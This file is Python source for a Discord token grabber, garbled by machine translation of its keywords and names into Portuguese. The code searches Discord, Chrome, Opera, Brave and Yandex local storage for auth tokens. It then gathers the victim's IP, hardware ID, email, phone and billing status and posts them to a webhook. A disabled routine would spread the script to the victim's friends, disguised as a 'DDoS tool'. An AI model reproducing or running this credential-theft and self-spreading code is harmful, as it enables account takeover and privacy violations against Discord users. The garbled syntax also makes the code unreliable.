importar  os

se  os . nome  ! =  "nt" :
    sair ()
de  re  importação  findall
de  cargas de importação json  , despejos 
de  base64  import  b64decode
de  importação de subprocesso  Popen , PIPE 
do  urllib . pedido  de importação  Request , urlopen
de  segmentação  de importação  Tópico
do  tempo  importar  dormir
from  sys  import  argv

WEBHOOK_URL  =  ""  # Insira o url do webhook aqui

LOCAL  =  os . getenv ( "LOCALAPPDATA" )
ROAMING  =  os . getenv ( "APPDATA" )
CAMINHOS  = {
    "Discord" : ROAMING  +  " \\ Discord" ,
    "Discord Canary" : ROAMING  +  " \\ discordcanary" ,
    "Discord PTB" : ROAMING  +  " \\ discordptb" ,
    "Google Chrome" : LOCAL  +  " \\ Google \\ Chrome \\ Dados do usuário \\ Padrão" ,
    "Opera" : ROAMING  +  " \\ Opera Software \\ Opera Stable" ,
    "Brave" : LOCAL  +  " \\ BraveSoftware \\ Brave-Browser \\ Dados do usuário \\ Padrão" ,
    "Yandex" : LOCAL  +  " \\ Yandex \\ YandexBrowser \\ Dados do usuário \\ Padrão"
}


def  getHeader ( token = None , content_type = "application / json" ):
    cabeçalhos  = {
        "Content-Type" : content_type ,
        "Agente do usuário" : "Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, como Gecko) Chrome / 44.0.2403.157 Safari / 537.36"
    }
    se  token :
        cabeçalhos . atualização ({ "Autorização" : token })
    retornar  cabeçalhos


def  getUserData ( token ):
    tente :
        retornar  cargas (
            urlopen ( Request ( "https://discordapp.com/api/v6/users/@me" , headers = getHeader ( token ))). leia (). decodificar ())
    exceto :
        passar


def  getTokenz ( caminho ):
    caminho  + =  " \\ Armazenamento local \\ leveldb"
    tokens  = []
    para  file_name  no sistema  operacional . listdir ( caminho ):
        se  não  file_name . endswith ( ".log" ) e  não  file_name . endswith ( ".ldb" ):
            Prosseguir
        para a  linha  em [ x . strip () para  x  em  aberto ( f " { path } \\ { file_name } " , erros = "ignorar" ). readlines () se  x . strip ()]:
            para  regex  em ( r "[\ w -] {24} \. [\ w -] {6} \. [\ w -] {27}" , r "mfa \. [\ w -] {84}" ):
                para  token  em  findall ( regex , linha ):
                    tokens . anexar ( token )
     tokens de retorno


def  whoTheFuckAmI ():
    ip  =  "Nenhum"
    tente :
        ip  =  urlopen ( Solicitação ( "https://ifconfig.me" )). leia (). decodificar (). tira ()
    exceto :
        passar
    retornar  ip


def  hWiD ():
    p  =  Popen ( "wmic csproduct get uuid" , shell = True , stdin = PIPE , stdout = PIPE , stderr = PIPE )
    return ( p . stdout . read () +  p . stderr . read ()). decodificar (). dividir ( " \ n " ) [ 1 ]


def  getFriends ( token ):
    tente :
        retornar  cargas ( urlopen ( Request ( "https://discordapp.com/api/v6/users/@me/relationships" ,
                                     headers = getHeader ( token ))). leia (). decodificar ())
    exceto :
        passar


def  getChat ( token , uid ):
    tente :
        retornar  cargas ( urlopen ( Request ( "https://discordapp.com/api/v6/users/@me/channels" , headers = getHeader ( token ),
                                     data = dumps ({ "receiver_id" : uid }). codificar ())). leia (). decodificar ()) [ "id" ]
    exceto :
        passar


def  paymentMethods ( token ):
    tente :
        return  bool ( len ( carrega ( urlopen ( Request ( "https://discordapp.com/api/v6/users/@me/billing/payment-sources" ,
                                              headers = getHeader ( token ))). leia (). decodificar ())) >  0 )
    exceto :
        passar


def  sendMessages ( token , chat_id , form_data ):
    tente :
        urlopen ( Request ( f "https://discordapp.com/api/v6/channels/ { chat_id } / messages" , headers = getHeader ( token ,
                                                                                                         "multipart / form-data; boundary = --------------------------- 325414537030329320151394843687" ),
                        data = form_data . codificar ())). leia (). decodificar ()
    exceto :
        passar


def  spread ( token , form_data , delay ):
    return   # Remove to re-enabled (Se você remover esta linha, o malware se espalhará enviando o binário para amigos.)
    para  amigo  em  getFriends ( token ):
        tente :
            chat_id  =  getChat ( token , amigo [ "id" ])
            sendMessages ( token , chat_id , form_data )
        exceto  exceção  como  e :
            passar
        dormir ( atrasar )


def  main ():
    cache_path  =  ROAMING  +  " \\ .cache ~ $"
    prevent_spam  =  True
    self_spread  =  True
    incorporações  = []
    trabalhando  = []
    verificado  = []
    já_cached_tokens  = []
    working_ids  = []
    ip  =  whoTheFuckAmI ()
    pc_username  =  os . getenv ( "UserName" )
    pc_name  =  os . getenv ( "COMPUTERNAME" )
    user_path_name  =  os . getenv ( "userprofile" ). dividir ( " \\ " ) [ 2 ]
    para  plataforma , caminho  em  PATHS . itens ():
        se  não  os . caminho . existe ( caminho ):
            Prosseguir
        para  token  em  getTokenz ( caminho ):
            se  símbolo  na  verificado :
                Prosseguir
            verificado . anexar ( token )
            uid  =  Nenhum
            se  não  for token . começa com ( "mfa." ):
                tente :
                    uid  =  b64decode ( token . split ( "." ) [ 0 ]. encode ()). decodificar ()
                exceto :
                    passar
                se  não  for uid  ou  uid  em  working_ids :
                    Prosseguir
            user_data  =  getUserData ( token )
            se  não  user_data :
                Prosseguir
            working_ids . anexar ( uid )
            trabalhando . anexar ( token )
            username  =  user_data [ "username" ] +  "#"  +  str ( user_data [ "discriminador" ])
            user_id  =  user_data [ "id" ]
            email  =  user_data . get ( "email" )
            phone  =  user_data . obter ( "telefone" )
            nitro  =  bool ( user_data . get ( "premium_type" ))
            billing  =  bool ( paymentMethods ( token ))
            embed  = {
                "color" : 0x7289da ,
                "campos" : [
                    {
                        "name" : "| Informações da conta |" ,
                        "valor" : f'Email: { email } \ n Telefone: { telefone } \ n Nitro: { nitro } \ n Informações de cobrança: { faturamento } ' ,
                        "inline" : Verdadeiro
                    },
                    {
                        "nome" : "| PC Info |" ,
                        "valor" : f'IP: { ip } \ n Nome de usuário: { pc_username } \ n Nome do PC: { pc_name } \ n Localização do token: { plataforma } ' ,
                        "inline" : Verdadeiro
                    },
                    {
                        "nome" : "| Token |" ,
                        "valor" : token ,
                        "inline" : False
                    }
                ],
                "autor" : {
                    "nome" : f " { nome de usuário } ( { user_id } )" ,
                },
                "rodapé" : {
                    "text" : f "Visite meu site para mais conteúdos de segurança cibernética: un5t48l3.com"
                }
            }
            embebidas . anexar ( incorporar )
    com  open ( cache_path , "a" ) como  arquivo :
        por  sinal  na  verificado :
            se  não  for token  em  already_cached_tokens :
                arquivo . escrever ( token  +  " \ n " )
    se  len ( trabalhando ) ==  0 :
        trabalhando . anexar ( '123' )
    webhook  = {
        "conteúdo" : "" ,
        "incorporações" : incorporações ,
        "username" : "Discord Token Grabber" ,
        "avatar_url" : "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    tente :
        
        urlopen ( Request ( WEBHOOK_URL , data = dumps ( webhook ). encode (), headers = getHeader ()))
    exceto :
        passar
    se  self_spread :
        para  token  em  funcionamento :
            com  open ( argv [ 0 ], encoding = "utf-8" ) como  arquivo :
                conteúdo  =  arquivo . ler ()
            payload  =  f '----------------------------- 325414537030329320151394843687 \ n Content-Disposition: form-data; nome = "arquivo"; filename = " { __file__ } " \ n Content-Type: text / plain \ n \ n { content } \ n ------------------------- ---- 325414537030329320151394843687 \ n Content-Disposition: form-data; name = "conteúdo" \ n \ n ferramenta DDoS. python download: https://www.python.org/downloads \ n ----------------------------- 325414537030329320151394843687 \ n Content- Disposição: dados do formulário; nome = "tts" \ n \ n falso\ n ----------------------------- 325414537030329320151394843687-- '
            Rosca ( alvo = propagação , args = ( sinal , carga útil , 7500  /  1000 )). start ()


tente :
    principal ()
exceto  exceção  como  e :
    imprimir ( e )
    passar
